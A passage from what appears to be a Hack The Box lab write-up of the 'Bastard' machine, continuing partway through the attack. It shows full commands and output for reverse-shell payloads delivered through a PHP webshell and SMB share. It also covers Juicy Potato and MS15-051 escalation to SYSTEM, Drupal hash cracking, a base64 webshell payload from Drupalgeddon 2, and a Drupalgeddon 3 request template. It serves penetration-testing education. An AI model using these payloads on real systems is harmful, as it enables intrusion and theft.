└─$ impacket-smbserver kali .                                                              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

Next, we can set up our listener using `msfconsole` and its `multi/handler` module. Our command allows us to pre-populate the required arguments using the `-x` flag, while the `-q` option prevents the usual Metasploit banner from being displayed when the console starts.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.62; set lport 1234; exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.10.14.62
lport => 1234
[*] Started reverse TCP handler on 10.10.14.62:1234
```

Now we can turn our focus to moving the Meterpreter reverse shell we generated earlier to the machine and then executing it to initiate a callback. To do this, we'll leverage the `shell.php` webshell we placed earlier, using `curl` to make our requests.

We first use the `copy` command to pull our file from the SMB server and save it to `C:\Windows\Temp`, as this is a world-writable location. We use `%20` to represent any spaces in the request, as leaving them unencoded could cause issues when the request is processed.

Once the file is in place, we simply need to call it using its absolute path. This should execute our payload and initiate a callback to our Kali machine.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ curl 'http://10.129.57.233/shell.php?cmd=copy%20\\10.10.14.62\kali\met.exe%20C:\Windows\Temp\met.exe'
        1 file(s) copied.

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ curl 'http://10.129.57.233/shell.php?cmd=C:\Windows\Temp\met.exe'
```

Our Metasploit handler receives a connection, and we can now drop into a shell session to confirm that we have an interactive session on the machine.
```Shell
[*] Sending stage (230982 bytes) to 10.129.57.233
[*] Meterpreter session 1 opened (10.10.14.62:1234 -> 10.129.57.233:49173) at 2026-09-05 22:55:17 -0400

meterpreter > shell
Process 2612 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr
```

## Foothold for Manual Workflow

As we also want to create a manual exploitation workflow, we'll need to make some alterations to the process above, as we're going to actively avoid using the Metasploit Framework for exploitation in this workflow.

We first use `msfvenom` to create a reverse shell binary to place on the box. We'll call this shell `rev.exe` to avoid mixing it up with the Meterpreter shell we created earlier. We can then set up `impacket-smbserver` again as our transport mechanism for moving the file to the machine in the next step.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.62 LPORT=443 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ impacket-smbserver kali .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

Before moving the file, we'll create a handler. In this instance, we'll use `rlwrap -cAr nc -lvnp 443`, which starts a Netcat listener on TCP port 443. The `rlwrap` command wraps Netcat and provides command history, arrow-key navigation, and improved terminal input, while `-cAr` enables colour support, Readline functionality, and automatic completion where supported.

We can now move the `rev.exe` file to the machine using our `shell.php` webshell. Using `curl`, we can create a request to copy the file from our SMB share and place it into the same `C:\Windows\Temp` location. Once the file is in place, all we need to do is call the shell using its absolute path, and we should receive a reverse connection from the machine.
```shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ curl 'http://10.129.57.233/shell.php?cmd=copy%20\\10.10.14.62\kali\rev.exe%20C:\Windows\Temp\rev.exe'
        1 file(s) copied.

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ curl 'http://10.129.57.233/shell.php?cmd=C:\Windows\Temp\rev.exe'
```

A connection opens on our handler, and we now have access to the Bastard machine with an interactive session. We again run the `whoami` command for good measure and can see that we're running in the context of the `nt authority\iusr` user.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ sudo rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.57.233] 49166
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr
```

---
## Privilege Escalation

As we now have two different workflows available to us and an interactive shell on the machine as the `nt authority\iusr` user, we can circle back to the enumeration phase. From here, we can start looking at the machine in more detail and determine what possible routes we can explore to escalate our privileges.
## Automated Enumeration & Exploitation

One thing we've learned from using the Metasploit Framework on previous machines is that it offers a wealth of features, including the **Local Exploit Suggester**, which can search for possible vulnerabilities that we may be able to use to gain control over the system.

We background the current session and load the `post/multi/recon/local_exploit_suggester` module. We can then use the `show options` command to see that the only option we need to set is the session we want the module to run against.
```bash
meterpreter > bg
[*] Backgrounding session 1...

msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester

msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1

msf post(multi/recon/local_exploit_suggester) > run
```

Once the module completes, it gives us thirteen possible modules that we can investigate on this machine. We already know that Microsoft Windows Server 2008 R2 Datacenter was released on October 22, 2009, and our earlier enumeration showed that no hotfixes have been applied.

This gives us a useful starting point when filtering the results. Any vulnerabilities affecting this version of Windows and disclosed after its release date are potential candidates, although we'll still need to investigate each one and confirm whether it is actually applicable to our environment.
![PrivEsc Suggester]({{ '/assets/img/htb-bastard/Bastard_PrivEsc_Suggester.png' | relative_url }})

**MS15-051 (Automated)**

Looking at a few of the candidates we're offered, we're able to narrow the options down to a handful of possible modules that may work given our environment. Researching each module helps us understand what it does and, more importantly, what conditions need to be present if we're going to attempt to use it.

> **MS15-051 / CVE-2015-1701**
> 
> A local privilege escalation vulnerability caused by a flaw in the Windows kernel-mode graphics driver (`win32k.sys`). The vulnerability allows a standard user to manipulate memory structures in a way that can cause the kernel to execute attacker-controlled code with elevated privileges. By exploiting this behaviour, an attacker can obtain the **SYSTEM access token**, allowing them to gain full administrative control over the machine.
> 
> Further research shows that the CVE designation for **MS15-051** is **CVE-2015-1701**, giving us the answer to 'Guided Mode' task six's question.

With our selection made, we load the `exploit/windows/local/ms15_051_client_copy_image` module and use the `show options` command to see which options we'll need to configure before attempting to run the exploit.

1. **LHOST:** The first thing we need to change is the `LHOST` value, which we set to our `tun0` interface.
2. **Payload:** Next, we set the payload to `windows/x64/shell/reverse_tcp`. We discovered this through some trial and error, as initially running the module produced an error explaining that certain payload types aren't compatible with this exploit. We can set the appropriate payload now so the module has everything it needs when we run it.
3. **Target:** We then use `show targets` and can see that the exploit module provides both 32-bit and 64-bit target options. As we established earlier that the machine is running a 64-bit architecture, we select the latter.
4. **Session:** Finally, we set the session to `1`, which is our current working session and the one we'll use to run the exploit against the machine.

```Shell
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.243.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86

View the full module info with the info, or info -d command.

msf exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
LHOST => 10.10.14.62
msf exploit(windows/local/ms15_051_client_copy_image) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp  
msf exploit(windows/local/ms15_051_client_copy_image) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Windows x86
    1   Windows x64

msf exploit(windows/local/ms15_051_client_copy_image) > set target 1
target => 1
msf exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
SESSION => 1
msf exploit(windows/local/ms15_051_client_copy_image) > run
```

Once we run the exploit, we can see that it completes successfully, and we now have access to the machine. This gives us our initial foothold and allows us to continue with the next stage of enumeration.
```Shell
msf exploit(windows/local/ms15_051_client_copy_image) > run
[*] Started reverse TCP handler on 10.10.14.62:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 2592 launched.
[*] Reflectively injecting the DLL into 2592...
[*] Sending stage (336 bytes) to 10.129.57.233
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Command shell session 2 opened (10.10.14.62:4444 -> 10.129.57.233:49177) at 2026-09-05 23:16:33 -0400


Shell Banner:
Microsoft Windows [Version 6.1.7600]
-----
          

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr
```

## Manual Enumeration & Exploitation

As we also have a manual workflow, we can attempt to enumerate possible vulnerabilities without using the Metasploit Framework. From here, we'll attempt to identify a privilege escalation path by hand and then exploit it.

We also have the findings from our automated workflow, which showed that the machine is vulnerable to MS15-051. We can use this exploit manually as well, allowing us to complete both sides of our workflow.

**Juicy Potato**

After gaining initial access to the machine using our `rev.exe` reverse shell, we can carry out some additional enumeration. One command that proves to be particularly valuable is `whoami /priv`. This allows us to see which privileges have been assigned to the `nt authority\iusr` account.

Running the command shows that `SeImpersonatePrivilege` is enabled. This privilege is commonly assigned to IIS worker processes, allowing them to perform operations and access resources under the security context of a connected client.

The presence of `SeImpersonatePrivilege` is particularly interesting to us, as it means the account may be able to abuse one of the **Potato** privilege escalation techniques to impersonate a more privileged security token and potentially obtain SYSTEM privileges.
```Shell
C:\inetpub\drupal-7.54>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Through some additional research, we find that Microsoft Windows Server 2008 R2 Datacenter is vulnerable to the **Juicy Potato** variant. This is also reflected in the results from our earlier automated scan using the `post/multi/recon/local_exploit_suggester` module, where we saw option 13 listed as `exploit/windows/local/ms16_075_reflection_juicy`, which we glanced over earlier.

We use `wget` to download a precompiled Juicy Potato binary into our exploit directory, which we're hosting through our SMB share. This gives us a quick way to deploy the exploit to the machine in the next step.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ wget https://raw.githubusercontent.com/k4sth4/Juicy-Potato/main/x64/jp.exe  
--2026-09-12 18:02:17--  https://raw.githubusercontent.com/k4sth4/Juicy-Potato/main/x64/jp.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 347648 (340K) [application/octet-stream]
Saving to: ‘jp.exe’

jp.exe                                  100%[============================================================================>] 339.50K  --.-KB/s    in 0.05s   

2026-09-12 18:02:18 (6.13 MB/s) - ‘jp.exe’ saved [347648/347648]
```


> **Warning — A Note on Precompiled Binaries**
> 
>For convenience in this writeup, a precompiled `jp.exe` binary was used directly from a GitHub repo. In a real-world engagement, **this is not a safe practice**. Precompiled binaries — especially privilege escalation and exploitation tools pulled from random forks or unfamiliar repos — can be backdoored, bundled with malware, or silently modified without your knowledge. Running unverified binaries on a client's system (or even in your own lab) is a real risk.
>
>Best practice is to:
>- Source exploit code from reputable, well-known repositories (e.g. the original author's repo, Exploit-DB, or established security research orgs)
>- Review the source code yourself before compiling or running it, when feasible
>- Compile from source rather than trusting a prebuilt binary, so you know exactly what's running
>- Test in an isolated environment before using in any live engagement
> 
>For this lab environment the precompiled binary is fine, but this is a habit worth flagging for anyone following along.

To use this exploit, we'll first set up a separate Netcat listener that will catch the connection when we re-run `rev.exe` through Juicy Potato. Because the reverse shell will be launched using a higher-privileged security context, we should receive a shell with elevated privileges once the connection is returned.

We run `jp.exe` directly from our SMB share (`\\10.10.14.62\kali\jp.exe`). We use `-l 1337` to listen on port 1337, `-p C:\Windows\Temp\rev.exe` to specify the program we want to launch once a privileged token has been captured, and `-t *` to allow Juicy Potato to try both `CreateProcessWithTokenW` and `CreateProcessAsUser`, using whichever method works.

Finally, we use `-c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` to target the BITS (Background Intelligent Transfer Service) CLSID, which is known to work with Juicy Potato on this version of Windows.

The output confirms that the exploit has succeeded. `authresult 0` and `CreateProcessWithTokenW OK` indicate that Juicy Potato was able to abuse our `SeImpersonatePrivilege` and successfully launch `rev.exe` using the impersonated privileged token. This should trigger our Netcat listener and return a shell running in the context of `NT AUTHORITY\SYSTEM`.
```Shell
C:\inetpub\drupal-7.54>\\10.10.14.62\kali\jp.exe -l 1337 -p C:\Windows\Temp\rev.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

\\10.10.14.62\kali\jp.exe -l 1337 -p C:\Windows\Temp\rev.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Checking the newly opened shell, we can see that we are indeed running as `NT AUTHORITY\SYSTEM`, giving us complete control over the machine.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.57.233] 49197
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

**MS15-052 (Manual)**

To finish off the machine, we can now also run the MS15-052 exploit we identified earlier during our automated workflow. We can source the exploit from [here](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip). Once downloaded, we grab the 64-bit version, rename it to `exploit.exe` for ease of use, and place it into our Exploit directory where we're hosting our SMB share.

Rewinding back to our original `rev.exe` session running as `nt authority\iusr`, we can use the exploit to re-run the `rev.exe` reverse shell with elevated privileges, allowing us to escalate our privileges. We'll need to set up a handler for the newly created session using `nc -lvnp 443` before running the exploit.

With everything set up, we can use `exploit.exe` directly from our SMB share and then trigger the `rev.exe` reverse shell executable we placed on the machine earlier.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ sudo rlwrap -cAr nc -lvnp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.57.233] 49198
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>\\10.10.14.62\kali\exploit.exe C:\Windows\Temp\rev.exe
\\10.10.14.62\kali\exploit.exe C:\Windows\Temp\rev.exe
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2024 created.
==============================
```

We successfully receive a callback from the machine, and once again we've owned the box. With our privilege escalation complete, we can now turn our attention to locating the flags in the next section.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Bastard]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.57.233] 49200
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```

---
## Obtaining the Flags

With our elevated access, we can now focus on locating the flags and completing the box. For this, we'll again use the `find` command to locate both flags. This saves us from trawling through files and directories manually and allows us to quickly locate what we're looking for.

Once the flags are found, we use the `type` command to read their contents and successfully grab both the user and root flags in one sweep. This completes the machine, and we can now move on to checking whether there's anything we might have missed.
```Shell
C:\inetpub\drupal-7.54>dir C:\ /s /b /a:-d 2>nul | find "user.txt"
dir C:\ /s /b /a:-d 2>nul | find "user.txt"
C:\Users\dimitris\Desktop\user.txt

C:\inetpub\drupal-7.54>dir C:\ /s /b /a:-d 2>nul | find "root.txt"
dir C:\ /s /b /a:-d 2>nul | find "root.txt"
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\root.txt.lnk
C:\Users\Administrator\Desktop\root.txt

C:\inetpub\drupal-7.54>type "C:\Users\dimitris\Desktop\user.txt"
type "C:\Users\dimitris\Desktop\user.txt"
[user flag redacted]

C:\inetpub\drupal-7.54>type "C:\Users\Administrator\Desktop\root.txt"
type "C:\Users\Administrator\Desktop\root.txt"
[root flag redacted]
```

The machine has been successfully completed, but some further reading shows that there are other ways to gain a foothold on this machine. In the **Beyond Root** section, we'll rewind back to our initial reconnaissance and attempt to explore some of the other routes we could have taken to gain our initial foothold.

---
## Beyond Root

In this section, we'll rewind to the point of initial access and attempt a few different approaches. First, we'll explore the possibility of cracking the hash we discovered after the `drupal.php` exploit completed. The exploit created a `sessions.json` file containing the administrator's Drupal 7 password hash, which we can now investigate further.

Thereafter, we'll look at two alternative exploits that we identified earlier when running `searchsploit`. We saw both **Drupalgeddon 2** and **Drupalgeddon 3**, which we can investigate to see whether either could have been used to gain RCE on the machine.


> **Machine Reset**
> In the notes ahead, you'll see that the machine's IP address has changed. This is due to a full reset of the machine to remove anything we may have placed on the box during our initial pass. We don't want to create false results or run into issues caused by leftover artifacts from our previous completion.
> 
> * **Old IP Address**: 10.129.57.233
> * **New IP Address**: 10.129.61.127

## Attempting to Crack the Hash

First off, let's see if we can crack the hash we found in the `sessions.json` file created after the `drupal.php` exploit ran. We'll first need to place the administrator's Drupal 7 hash into a file called `admin.hash`, after which we can use Hashcat with the RockYou wordlist to attempt to crack it.

Once we have our hash file, we can attempt to crack it using Hashcat. A quick bit of research tells us that the Hashcat mode for Drupal 7 is `-m 7900`. After starting the cracking attempt, we can use the `s` key to display the current status of the operation.

Unfortunately, we find that at our current cracking rate, the estimated time to completion is around **8 hours and 24 minutes**. Given that we could spend all that time only to find nothing, while already having RCE and the administrator's session cookie, this quickly becomes a time sink with very little potential payoff. We decide to leave the hash cracking here and move on to something more worthwhile.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Loot]
└─$ cat admin.hash
$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE 

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Loot]
└─$ hashcat -m 7900 admin.hash /usr/share/wordlists/rockyou.txt -o admin.cracked --force
hashcat (v7.1.2) starting

 [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 7900 (Drupal7)
Hash.Target......: $S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE
Time.Started.....: Sun Sep 13 05:58:46 2026, (1 min, 37 secs)
Time.Estimated...: Sun Sep 13 14:24:56 2026, (8 hours, 24 mins)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      472 H/s (12.40ms) @ Accel:48 Loops:1024 Thr:1 Vec:4
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 45504/14344385 (0.32%)
Rejected.........: 0/45504 (0.00%)
Restore.Point....: 45504/14344385 (0.32%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:31744-32768
Candidate.Engine.: Device Generator
Candidates.#01...: tamika1 -> milkdud
Hardware.Mon.#01.: Util: 96%

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q
```

## Drupalgeddon 2

Drupalgeddon 2 offers us three possible variants that we can use: two manual approaches and one Metasploit module. To understand our options, we do some research and create the following summary:

1. **44449.rb (Ruby)** — A Ruby port of the original Drupalgeddon 2 exploit. It abuses the `user/register` endpoint's Form API `#post_render` callback and, by default, writes a PHP webshell to disk (`sh.php`), which we can then interact with separately.
2. **44448.py (Python)** — A standalone PoC exploiting the same Form API vulnerability, but executes commands directly with each request rather than writing a persistent file to the webroot.
3. **44482.rb (Metasploit module)** — The fully automated version, handling fingerprinting, exploitation, and payload delivery through `msfconsole`, wrapping the same underlying vulnerability into a single guided workflow.

**44448.py (Python)**

We can start with the Python script variation and see if it runs. The script itself only requires a single argument: the target URL against which we want to run the exploit.

Running the exploit against the machine shows that it doesn't appear to be vulnerable. We could spend some time investigating why this is the case, but while we still have other options available, it makes more sense to move on and test those instead.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ python3 44448.py                    
################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://10.129.61.127/
Not exploitable
```

**44449.rb (Ruby)**

As the last exploit failed, we can attempt to run the Ruby script to see if we get any better results. We first need to install a couple of dependencies for the exploit to run correctly, but once these are in place, the exploit works and grants us RCE on the machine.

We need to install both the `highline` and `ruby-dev` packages using the APT package manager.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ sudo gem install highline
[sudo] password for kali: 
Fetching highline-3.1.2.gem
Successfully installed highline-3.1.2
Parsing documentation for highline-3.1.2
Installing ri documentation for highline-3.1.2
Done installing documentation for highline after 1 seconds
1 gem installed

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ sudo apt install ruby-dev
ruby-dev is already the newest version (1:3.3+b1).
ruby-dev set to manually installed.
Summary:                    
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 2213
```

Now when we run the exploit, we can see that it completes successfully and gives us RCE through a webshell that it places on the machine.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ ruby 44449.rb http://10.129.61.127/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.129.61.127/
--------------------------------------------------------------------------------
[+] Found  : http://10.129.61.127/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo QGWVHLKA
[+] Result : QGWVHLKA
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.129.61.127/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.129.61.127/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.129.61.127/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
```

**44482.rb (Metasploit module)**

Out of curiosity, we also tried the Metasploit module (`exploit/unix/webapp/drupal_drupalgeddon2`) to see how it compared to the manual scripts. Unfortunately, it repeatedly failed with a `404` and an empty response. After some investigation, we found that IIS was blocking the request because the payload was too large for its query string limit.

We tried switching to a smaller payload, but this made very little difference to the overall size. We then looked at `php/exec`, which is small enough to get around the query string limitation. Unfortunately, this introduced another problem: the module expects a payload that opens a session, while `php/exec` doesn't provide this functionality, causing the module itself to crash.

In the end, the Metasploit module simply wasn't going to work in this environment. Every payload it can actually use is too large for IIS, while the only payload small enough to get around the restriction isn't supported by the module.

This gives us an interesting contrast between the manual and automated approaches. Of the three Drupalgeddon 2 options we tested, only `44449.rb` worked for us, while `44448.py` reported that the target wasn't vulnerable and the Metasploit module hit the IIS query string limitation.

It's therefore not as simple as saying that manual exploitation is always better than using an automated framework. In this case, the specific Metasploit module simply hit a limitation that the Ruby exploit didn't, showing why understanding the underlying vulnerability and having alternative approaches available can be valuable.

## Drupalgeddon 3

Finally, we'll attempt the Drupalgeddon 3 exploit to see how this fares. We notice that the exploit listings are marked as **Authenticated**, meaning we'll need access to the CMS control panel with the appropriate permissions for the exploit to work.

Fortunately, we still have our original `drupal.php` exploit to hand, which we can re-run to obtain the administrator's session cookie and use this to gain the access required by the exploit.

Using `searchsploit -x php/webapps/44542.txt`, we can read through the accompanying instructions for the exploit. This gives us some useful information about the vulnerability itself, as well as the requirements that need to be met for the exploit to work. With this information, we can determine what access and permissions we'll need before attempting to run it.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ searchsploit -x php/webapps/44542.txt

This is a sample of exploit for Drupal 7 new vulnerability SA-CORE-2018-004 / CVE-2018-7602.

You must be authenticated and with the power of deleting a node. Some other forms may be vulnerable : at least, all of forms that is in 2-step (form then confirm).

POST /?q=node/99/delete&destination=node?q[%2523][]=passthru%26q[%2523type]=markup%26q[%2523markup]=whoami HTTP/1.1
[...]
form_id=node_delete_confirm&_triggering_element_name=form_id&form_token=[CSRF-TOKEN]

Retrieve the form_build_id from the response, and then triggering the exploit with :

POST /drupal/?q=file/ajax/actions/cancel/%23options/path/[FORM_BUILD_ID] HTTP/1.1
[...]
form_build_id=[FORM_BUILD_ID]

This will display the result of the whoami command.

Patch your systems!
Blaklis
```

This means we'll need to re-run `drupal.php` because we've reset the machine and our previous session cookie is no longer valid. Once the exploit completes, we can check `session.json` again and retrieve the values we'll need to make the Drupalgeddon 3 exploit work.
```JSON
{
    "session_name": "SESS56c5897b0eb2402b5d017a288d71cb18",
    "session_id": "Ozs3EAztYTgX25TwAZTELcrB9bldJG26ZZq3PpGPo2U",
    "token": "paHtro7CIQRSA0e0FM6PeeSky8piqZpBs_1a-ILjLSs"
}
```

We first need to gain access to the Drupal CMS control panel. For this, we'll use **Cookie Editor** to create a new session cookie using the values we retrieved from `session.json`, effectively replacing our current session with that of the administrator.

Once we've entered the required values and saved the cookie, we can refresh the page. If everything has been entered correctly, we should now be authenticated to the Drupal CMS as the administrator.
![BeyondRoot Cookie]({{ '/assets/img/htb-bastard/Bastard_BeyondRoot_Cookie.png' | relative_url }})

After refreshing the page, we can see that we're now logged in as the administrator. The instructions in the text file we looked at earlier tell us that we'll need to know the **node ID** in order to construct the requests required by the exploit.

We can find this by clicking **"Find content"** in the top-left corner of the Drupal control panel, which is highlighted in the image below.
![BeyondRoot AdminSession]({{ '/assets/img/htb-bastard/Bastard_BeyondRoot_AdminSession.png' | relative_url }})

Once the panel opens, we can see a node named **"REST"**. Hovering over the link shows us the URL `http://10.129.61.127/node/1`, which tells us that the node ID is `1`. We can also click the link to confirm that this is the correct node.
![BeyondRoot Content]({{ '/assets/img/htb-bastard/Bastard_BeyondRoot_Content.png' | relative_url }})

After clicking the link, we can confirm that the **"REST"** API is listed as node `1`. This gives us the node ID we need and allows us to formulate the request required for the exploit.
